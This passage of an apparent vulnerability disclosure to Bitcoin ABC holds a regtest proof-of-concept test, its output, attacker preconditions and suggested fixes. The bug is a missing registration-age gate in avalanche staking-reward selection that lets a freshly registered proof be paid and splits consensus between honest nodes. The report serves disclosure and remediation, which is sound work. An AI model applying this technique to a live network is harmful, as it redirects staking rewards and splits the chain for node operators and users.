        now = int(time.time()) + 91 * 60 + 1
        for n in self.nodes:
            n.setmocktime(now)

        # The first block after the jump is scored against a previous block
        # whose timestamp predates the jump, so no proof is old enough and it
        # has no winner. Mine it now so every later block has a computable
        # winner, exactly like the mock.
        blk = node0.getblock(self.generate(node0, 1, sync_fun=self.no_op)[0], 0)
        node1.submitblock(blk)
        self.sync_blocks([node0] + Q0, timeout=120)
        self.sync_blocks([node1] + Q1, timeout=120)

        # -------------------------------------------------------------------
        # STEP 5 (CONTROL): a block paying the age-gated winner W is accepted by
        # node1. Mine one such block (P_new not registered anywhere yet), feed
        # it to node1, and prove both nodes agree on W and node1 accepts it.
        # -------------------------------------------------------------------
        self.log.info("STEP 5: CONTROL -- a W-paying block is accepted by node1")
        control_prev = node0.getbestblockhash()
        control_tip = self.generate(node0, 1, sync_fun=self.no_op)[0]
        node1.submitblock(node0.getblock(control_tip, 0))
        self.sync_blocks([node0] + Q0, timeout=120)
        self.wait_until(lambda: node0.hasstakingreward(control_tip))
        self.wait_until(lambda: node1.hasstakingreward(control_tip))
        r0 = node0.getstakingreward(control_tip)
        r1 = node1.getstakingreward(control_tip)
        assert_equal(r0[0]["proofid"], r1[0]["proofid"])
        assert_equal(r0[0]["hex"], r1[0]["hex"])
        assert_equal(node1.getbestblockhash(), control_tip)
        assert_equal(node0.getbestblockhash(), control_tip)
        self.log.info(
            "  -> node0 and node1 agree on the age-gated winner and node1 "
            "accepted node0's W-paying control block"
        )

        # -------------------------------------------------------------------
        # STEP 6: register P_new into node0's partition ONLY, at the frozen
        # clock value (its registration_time is therefore exactly `now`).
        # -------------------------------------------------------------------
        # Inject P_new at ONE quorum node and let it reach node0 by real P2P
        # proof gossip. This is required, not cosmetic: the sendavalancheproof
        # RPC registers and relays a proof but never calls
        # Processor::reconcileOrFinalize (rpc/avalanche.cpp:1640-1653), so an
        # RPC-injected proof is never added to the local vote records and can
        # never reach hasFinalized. Only the P2P receive path polls it
        # (net_processing.cpp:9450). Arriving by gossip is also exactly what a
        # real new staker's proof does.
        self.log.info("STEP 6: inject P_new at Q0[0]; it gossips across node0's side")
        p_new_hex = p_new_proof.serialize().hex()
        Q0[0].sendavalancheproof(p_new_hex)

        p_new_id_hex = uint256_hex(p_new_proof.proofid)

        def knows_p_new_contender(n):
            tip = n.getbestblockhash()
            return (
                n.getstakecontendervote(tip, p_new_id_hex)
                != AvalancheContenderVoteError.UNKNOWN
            )

        for n in [node0] + Q0:
            self.wait_until(lambda n=n: knows_p_new_contender(n), timeout=120)
        self.log.info("  -> node0 and every Q0 node have P_new in the contender cache")

        # node1's partition must NOT know P_new (structural isolation).
        for n in [node1] + Q1:
            try:
                n.getrawavalancheproof(p_new_id_hex)
                raise AssertionError("node1 partition unexpectedly knows P_new")
            except JSONRPCException:
                pass
            assert p_new_proof.proofid not in set(get_proof_ids(n))
        self.log.info("  -> node1 and every Q1 node do NOT know P_new")

        # P_new must be avalanche-FINALIZED before the clock is advanced. The
        # "finalized" field of getrawavalancheproof is Peer::hasFinalized
        # (rpc/avalanche.cpp:1337-1340), which is the OTHER precondition Path A
        # checks at peermanager.cpp:1097. Satisfying it here means the only
        # remaining reason Path A can refuse P_new is its registration age.
        def p_new_finalized(n):
            try:
                return n.getrawavalancheproof(p_new_id_hex)["finalized"] is True
            except JSONRPCException:
                return False

        # Q0[0] is the injection point, so it holds P_new from the RPC path and
        # cannot finalize it; every other node on this side received P_new over
        # P2P and polls it normally.
        for n in [node0] + Q0[1:]:
            self.wait_until(
                lambda n=n: p_new_finalized(n), timeout=300, check_interval=0.5
            )
        self.log.info("  -> P_new is avalanche-finalized on node0 and on Q0[1:]")

        # -------------------------------------------------------------------
        # STEP 6b: age P_new to EXACTLY 10 minutes. refTime is taken from the
        # previous block's timestamp, capped to now (peermanager.cpp:1075), so
        # advance mocktime +10min and mine one transition block; every block
        # after it carries the advanced timestamp. 10min < DANGLING_TIMEOUT
        # (15min) keeps cleanupDanglingProofs from dropping P_new despite
        # node_count == 0, and 10min < 30min keeps Path A skipping it.
        # -------------------------------------------------------------------
        t_p_new_reg = now
        t_aged = t_p_new_reg + 10 * 60
        self.log.info("STEP 6b: advance mocktime +10min so P_new is exactly 10min old")
        for n in self.nodes:
            n.setmocktime(t_aged)

        # The first block after a clock jump is still scored against a previous
        # block whose timestamp predates the jump, so mine it as a throwaway.
        blk = node0.getblock(self.generate(node0, 1, sync_fun=self.no_op)[0], 0)
        node1.submitblock(blk)
        self.sync_blocks([node0] + Q0, timeout=120)
        self.sync_blocks([node1] + Q1, timeout=120)

        # P_new survived the jump: still registered, still bound to a peer, and
        # still finalized -- with no node attached to it, which is exactly why
        # the 15 minute dangling timeout bounds how far the age can be pushed.
        info = node0.getrawavalancheproof(p_new_id_hex)
        assert_equal(info["boundToPeer"], True)
        assert_equal(info["finalized"], True)
        peerinfo = node0.getavalanchepeerinfo(p_new_id_hex)
        assert_equal(len(peerinfo), 1)
        assert_equal(peerinfo[0]["nodecount"], 0)
        self.log.info(
            "  -> P_new still registered, bound and finalized after the jump"
        )

        # -------------------------------------------------------------------
        # STEP 7: mine until P_new outranks the age-gated local winner. At
        # every earlier ("losing") tip P_new loses the reward-rank draw, so Q0
        # votes it down and it never enters node0's winner set; node0 and node1
        # keep agreeing on W and node1 accepts each W-paying block (control).
        # -------------------------------------------------------------------
        self.log.info("STEP 7: mine until P_new wins the reward-rank draw")
        split_prev = None
        winner_proofid = None
        for _ in range(60):
            tip = self.generate(node0, 1, sync_fun=self.no_op)[0]
            node1.submitblock(node0.getblock(tip, 0))
            self.sync_blocks([node0] + Q0, timeout=120)

            self.wait_until(lambda: node0.hasstakingreward(tip))
            self.wait_until(lambda: node1.hasstakingreward(tip))

            # node1 never has P_new, so its winner is always the age-gated W.
            r1 = node1.getstakingreward(tip)
            assert all(int(w["proofid"], 16) != p_new_proof.proofid for w in r1)
            w_proofid = int(r1[0]["proofid"], 16)
            w_score = next(
                p.get_score() for p in base_proofs if p.proofid == w_proofid
            )
            rank_w = proof_reward_rank(make_contender_id(tip, w_proofid), w_score)
            rank_new = proof_reward_rank(
                make_contender_id(tip, p_new_proof.proofid), p_new_proof.get_score()
            )

            if rank_new < rank_w:
                split_prev = tip
                winner_proofid = w_proofid
                self.log.info("  -> P_new outranks W at this tip: split candidate")
                break

            # Losing tip: it is a control block. node0 keeps W (Q0 votes P_new
            # down organically), node1 agrees and accepts the W-paying block.
            r0 = node0.getstakingreward(tip)
            assert_equal(r0[0]["proofid"], r1[0]["proofid"])
            assert all(int(w["proofid"], 16) != p_new_proof.proofid for w in r0)
            assert_equal(node1.getbestblockhash(), tip)

        assert split_prev is not None, "P_new never outranked the local winner"

        # Make sure Q0 is fully synced to split_prev so it promotes and polls
        # the split_prev contenders, and that node1's whole partition is on
        # split_prev too (so the split block is a real tip candidate there).
        self.sync_blocks([node0] + Q0, timeout=120)
        self.sync_blocks([node1] + Q1, timeout=120)

        # The measured registration age of P_new at split_prev, computed the
        # same way the node does: refTime = min(previous block time, now)
        # (peermanager.cpp:1075), age = refTime - registration_time.
        split_prev_time = node0.getblockheader(split_prev)["time"]
        p_new_age = min(split_prev_time, t_aged) - t_p_new_reg
        assert_equal(p_new_age, 10 * 60)
        # Inside the 30 minute skip threshold, so Path A cannot select P_new at
        # any winners position (peermanager.cpp:1097-1098), and below the 15
        # minute dangling timeout, so the proof is still alive and finalized.
        assert p_new_age < 30 * 60
        assert p_new_age < 15 * 60
        self.log.info(
            f"  -> P_new measured registration age at split_prev: {p_new_age}s"
        )

        # -------------------------------------------------------------------
        # STEP 8: ORGANIC finalization. node0's own event loop polls the real
        # Q0 about P_new's contender for split_prev; Q0 answers ACCEPTED from
        # its own getVoteStatus (P_new is Q0's pollableContenders[0]). When
        # node0's poll converges, finalizeStakeContender promotes P_new into
        # the winner set and it becomes winners[0]. NO vote is scripted here.
        # -------------------------------------------------------------------
        self.log.info(
            "STEP 8: wait for node0 to ORGANICALLY finalize P_new's contender"
        )
        self.wait_until(
            lambda: int(node0.getstakingreward(split_prev)[0]["proofid"], 16)
            == p_new_proof.proofid,
            timeout=120,
        )

        r0 = node0.getstakingreward(split_prev)
        assert_equal(int(r0[0]["proofid"], 16), p_new_proof.proofid)
        assert_equal(r0[0]["hex"], p_new_proof.payout_script.hex())

        gbt = node0.getblocktemplate()
        assert "stakingrewards" in gbt
        assert_equal(gbt["stakingrewards"]["script"], p_new_proof.payout_script.hex())

        # node1 still applies the age gate: P_new is not in its winner set.
        r1 = node1.getstakingreward(split_prev)
        assert_equal(int(r1[0]["proofid"], 16), winner_proofid)
        assert all(int(w["proofid"], 16) != p_new_proof.proofid for w in r1)
        self.log.info(
            "  -> node0 pays a 10-minute-old finalized proof as winners[0]; "
            "node1 keeps W"
        )

        # -------------------------------------------------------------------
        # STEP 9: node0 mines the split block paying P_new; node1 and its whole
        # partition PARK it (policy-bad-staking-reward) -> chain split.
        # -------------------------------------------------------------------
        self.log.info("STEP 9: node0 mines the P_new-paying block; node1 parks it")
        split_block = self.generate(node0, 1, sync_fun=self.no_op)[0]
        assert_equal(node0.getbestblockhash(), split_block)

        coinbase = node0.getblock(split_block, 2)["tx"][0]
        total_out = sum(vout["value"] for vout in coinbase["vout"])
        staking_vout = [
            vout
            for vout in coinbase["vout"]
            if vout["scriptPubKey"]["hex"] == p_new_proof.payout_script.hex()
        ]
        assert_equal(len(staking_vout), 1)
        # GetStakingRewardsAmount: 10% of the full block reward.
        assert_equal(staking_vout[0]["value"], total_out * Decimal("0.1"))

        raw = node0.getblock(split_block, 0)

        # node0 is isolated from node1's partition, so the block only reaches
        # node1 via submitblock; node1 then relays it to Q1 over P2P. Submit to
        # every node1-partition node explicitly too so the park is deterministic
        # even if a relay is slow ("duplicate" is returned, not an error, for a
        # block already received over P2P).
        node1.submitblock(raw)
        for n in Q1:
            n.submitblock(raw)

        # Assert the park race-free: scan the ENTIRE debug log for the park line
        # tied to THIS block hash. (Do NOT use wait_for_debug_log's offset-based
        # chatty-submit pattern here: node1 relays the block to Q1 the instant it
        # arrives, so a Q1 node can park it BEFORE we capture the log offset, and
        # the offset scan would then miss the already-written park line.)
        park_line = f"policy-bad-staking-reward, Block {split_block}".encode()

        def park_logged(n):
            with open(n.debug_log_path, "rb") as dl:
                return park_line in dl.read()

        for n in (node1, Q1[0]):
            self.wait_until(lambda n=n: park_logged(n), timeout=120)

        # The split is now durable: node1's whole partition stays on split_prev
        # while node0 is on the P_new-paying split_block.
        assert_equal(node0.getbestblockhash(), split_block)
        for n in (node1, Q1[0]):
            self.wait_until(
                lambda n=n: n.getbestblockhash() == split_prev, timeout=120
            )
            split_tip = [t for t in n.getchaintips() if t["hash"] == split_block]
            assert_equal(len(split_tip), 1)
            assert_equal(split_tip[0]["status"], "parked")
        self.log.info("  -> node1 and Q1[0] both parked the split block")

        # node1's own avalanche vote on the block is PARKED (2). Poll it with a
        # throwaway no-handshake peer and verify the schnorr-signed response
        # against node1's own avalanche key.
        avakey1 = ECPubKey()
        avakey1.set(bytes.fromhex(node1.getavalanchekey()))
        poller = get_ava_p2p_interface_no_handshake(node1)
        poller.send_poll([int(split_block, 16)], MSG_BLOCK)
        response = poller.wait_for_avaresponse()
        r = response.response
        assert avakey1.verify_schnorr(response.sig, r.get_hash())
        assert_equal(len(r.votes), 1)
        assert_equal(
            repr(r.votes[0]),
            repr(AvalancheVote(AvalancheVoteError.PARKED, int(split_block, 16))),
        )
        self.log.info("  -> node1 votes PARKED on the split block")

        self.log.info(
            "RESULT: with a fully real quorum on both sides, node0's own "
            "avalanche loop organically finalized the contender of a proof "
            "registered 10 minutes ago -- avalanche-finalized, so the age gate "
            "was the ONLY reason Path A excluded it -- and paid it as "
            "winners[0]; node1 and its real quorum, which never saw that proof, "
            "kept the age-gated winner and parked the block. Consensus split "
            "from proof-registration timing + the missing age gate at "
            "peermanager.cpp:1530."
        )


if __name__ == "__main__":
    AvalancheStakingRewardAgeGateRealQuorumTest().main()
```

## 6. Verbatim test output

Captured from a fresh run against the pristine node binary at commit `28c310d`:

```
2026-08-19T17:41:21.008000Z TestFramework (INFO): Initializing test directory /var/folders/pn/lzm1slcd5212fnnkz_p8hb2c0000gn/T/bitcoin_func_test_v18j8k4x
2026-08-19T17:41:23.063000Z TestFramework (INFO): STEP 0: mine the shared base chain and distribute it
2026-08-19T17:41:26.230000Z TestFramework (INFO): Build 9 base proofs (shared Q0[i]/Q1[i]) and P_new
2026-08-19T17:41:26.276000Z TestFramework (INFO): STEP 1: restart the 2*K quorum nodes under their proofs
2026-08-19T17:41:33.542000Z TestFramework (INFO): STEP 2: wire node0+Q0 and node1+Q1 as isolated partitions
2026-08-19T17:41:40.524000Z TestFramework (INFO): STEP 3: form quorums and finalize base proofs organically
2026-08-19T17:41:40.617000Z TestFramework (INFO):   -> every node reports ready_to_poll
2026-08-19T17:41:55.070000Z TestFramework (INFO):   -> all 20 nodes finalized all 9 base proofs
2026-08-19T17:41:55.088000Z TestFramework (INFO): STEP 4: jump mocktime +91min to age the base proofs
2026-08-19T17:41:55.404000Z TestFramework (INFO): STEP 5: CONTROL -- a W-paying block is accepted by node1
2026-08-19T17:41:55.424000Z TestFramework (INFO):   -> node0 and node1 agree on the age-gated winner and node1 accepted node0's W-paying control block
2026-08-19T17:41:55.425000Z TestFramework (INFO): STEP 6: inject P_new at Q0[0]; it gossips across node0's side
2026-08-19T17:41:55.486000Z TestFramework (INFO):   -> node0 and every Q0 node have P_new in the contender cache
2026-08-19T17:41:55.496000Z TestFramework (INFO):   -> node1 and every Q1 node do NOT know P_new
2026-08-19T17:42:09.132000Z TestFramework (INFO):   -> P_new is avalanche-finalized on node0 and on Q0[1:]
2026-08-19T17:42:09.133000Z TestFramework (INFO): STEP 6b: advance mocktime +10min so P_new is exactly 10min old
2026-08-19T17:42:09.166000Z TestFramework (INFO):   -> P_new still registered, bound and finalized after the jump
2026-08-19T17:42:09.166000Z TestFramework (INFO): STEP 7: mine until P_new wins the reward-rank draw
2026-08-19T17:42:09.263000Z TestFramework (INFO):   -> P_new outranks W at this tip: split candidate
2026-08-19T17:42:09.268000Z TestFramework (INFO):   -> P_new measured registration age at split_prev: 600s
2026-08-19T17:42:09.268000Z TestFramework (INFO): STEP 8: wait for node0 to ORGANICALLY finalize P_new's contender
2026-08-19T17:42:15.115000Z TestFramework (INFO):   -> node0 pays a 10-minute-old finalized proof as winners[0]; node1 keeps W
2026-08-19T17:42:15.115000Z TestFramework (INFO): STEP 9: node0 mines the P_new-paying block; node1 parks it
2026-08-19T17:42:15.138000Z TestFramework (INFO):   -> node1 and Q1[0] both parked the split block
2026-08-19T17:42:15.308000Z TestFramework (INFO):   -> node1 votes PARKED on the split block
2026-08-19T17:42:15.308000Z TestFramework (INFO): RESULT: with a fully real quorum on both sides, node0's own avalanche loop organically finalized the contender of a proof registered 10 minutes ago -- avalanche-finalized, so the age gate was the ONLY reason Path A excluded it -- and paid it as winners[0]; node1 and its real quorum, which never saw that proof, kept the age-gated winner and parked the block. Consensus split from proof-registration timing + the missing age gate at peermanager.cpp:1530.
2026-08-19T17:42:15.364000Z TestFramework (INFO): Stopping nodes
2026-08-19T17:42:16.016000Z TestFramework (INFO): Cleaning up /var/folders/pn/lzm1slcd5212fnnkz_p8hb2c0000gn/T/bitcoin_func_test_v18j8k4x on exit
2026-08-19T17:42:16.016000Z TestFramework (INFO): Tests successful
```

I ran it three times with the same result, and the registration age assertion printed `600s` every time. node0, polling its own real quorum, finalizes the contender of a proof registered 10 minutes earlier and pays it as `winners[0]`. node1 and its real quorum, which never saw that proof, keep the age gated winner and park the block. node1 accepts the control block that pays the age gated winner, so the cause is the registration age and the missing gate, not the harness.

## 7. Preconditions and limitations

* The attacker is an ordinary participant who registers a proof inside the window before the target block. Registering a proof and broadcasting it are normal unprivileged actions, and no history as a staker is needed. That is the whole point: the roughly one hour the gate would have required is skipped.
* The window is not a knife edge. Path A skips any measured registration age under 30 minutes outright, and anything under 60 minutes cannot hold the paid position, so the two paths disagree anywhere in that band. The PoC pins the age at exactly 10 minutes rather than sitting at the extreme, and asserts the value. 10 minutes for two reasons: it is well inside the 30 minute skip threshold, and it is under `Peer::DANGLING_TIMEOUT` of 15 minutes, so `cleanupDanglingProofs` will not drop the proof mid test for the unrelated reason that no node presents it in an avahello. Pushing the measured age past 15 minutes in a functional test would need the proof to have an attached node, which is why the PoC sits at 10 minutes rather than closer to the 30 minute edge. Nothing about the defect depends on that choice: Path B applies no age check at any offset, so the two paths disagree everywhere below 60 minutes.
* The middle of that window needs no attacker at all, and that is the part I would worry about most. A proof that is 10 to 25 minutes old has had real time to reach a supermajority of one cluster's quorum, so its contender genuinely finalizes there while still being inside the gate and still plausibly unknown to other clusters. An ordinary large new stake registered under 30 minutes before a block can cause the same divergence by accident, which is exactly what the gate was written to prevent.
* The new proof has to win the reward rank draw for the block to pay it. Reward rank is `(256 - log2(contender_id)) / score`, and `contender_id` depends on the previous block hash and the proof id, so every block is a fresh draw. A proof with several times the stake score of the honest winners wins that draw often. The test just mines forward until it wins, which is what an attacker would do.
* The durable split in the test uses two isolated partitions only because avalanche proof relay is unconditional, so that is the one way to keep the new proof out of node1's view with certainty and get a deterministic result. On a live network you get the same split whenever a node has not yet finalized the new contender at the moment it validates the block. A node that finalizes it later may unpark; a node that never receives the proof stays parked. Either way honest nodes disagree about the tip for that window, and that is the damage.
* The money per block is the 10% staking reward that goes to the new proof. The bigger problem is the split between honest nodes running the same software.
* Everything is on regtest, no mainnet or testnet execution, per the disclosure policy. All 20 nodes, both quorums and every vote are real `bitcoind` behavior. No contender vote is scripted.

## 8. Suggested fix

Both paths that decide the paid winner need to apply the same eligibility, age gate included.

* Apply the registration age gate on the stake contender path, before a contender can be accepted as the best contender or finalized into the winner set. The acceptance of `pollableContenders[0]` at [src/avalanche/peermanager.cpp#L1530](https://github.com/Bitcoin-ABC/bitcoin-abc/blob/28c310db31248991c41559c1cd9e057bcc577594/src/avalanche/peermanager.cpp#L1530) should not take a proof that Path A would have rejected as too recently registered.
* Or do it at the other end: when `finalizeStakeContender` recomputes the winner list, filter out proofs whose `registration_time` falls inside the gate, so a finalized contender can never overwrite `winners[0]` with a proof younger than the target registration delay.
* At the very least, make `getWinners` and the miner payout agree with `selectStakingRewardWinner` about the age eligibility of `winners[0]`, so the payout path and the validity path cannot end up disagreeing about the same proof.

Any of these puts both paths back on the same test, which removes the reward redirection and the split together.

## 9. Reporter

* Name: Adeola
* Contact email: adeolasola01@gmail.com
* PGP fingerprint for encrypted response: `873605579C70210574E4B2A61DF11EE67D0C5C77` (RSA 4096)

My public key, so you can encrypt your reply:

```
-----BEGIN PGP PUBLIC KEY BLOCK-----

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
=wsjU
-----END PGP PUBLIC KEY BLOCK-----
```
